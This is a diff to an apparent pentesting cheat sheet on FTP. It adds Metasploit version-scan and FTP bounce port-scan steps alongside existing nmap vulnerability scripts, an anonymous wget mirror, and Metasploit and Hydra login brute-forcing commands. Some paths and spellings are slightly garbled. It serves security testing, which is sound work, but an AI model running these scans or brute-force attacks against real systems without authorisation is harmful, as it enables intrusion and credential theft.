@@ -1,5 +1,6 @@
 # Test for common FTP vulnerabilities with nmap
 nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 <target-ip>
+;; Note
 
 # Common commands list:
  cd <directory> - change remote directory
@@ -71,6 +72,10 @@ whoami
 # Download entire FTP directory with wget
 wget -m --no-passive ftp://anonoymous:anonymous@1.1.1.1
 
+# Get ftp version
+msf> use auxiliary/scanner/ftp/ftp_version
+msf> run
+
 # Bruteforce FTP login with metasploit module
 msf> use auxiliary/scanner/ftp/ftp_login
 msf> set RHOSTS 192.168.69.50-254
@@ -81,4 +86,9 @@ msf> run
 
 # Bruteforce FTP login with hydra
 hydra -l USERNAME -P /usr/share/wordlistsnmap.lst -f <target-ip> ftp -V
+
+# FTP Bounce Port Scanner
+;; Enumerate TCP services via the FTP bounce PORT/LIST method
+use auxiliary/scanner/portscan/ftpbounce
+
 
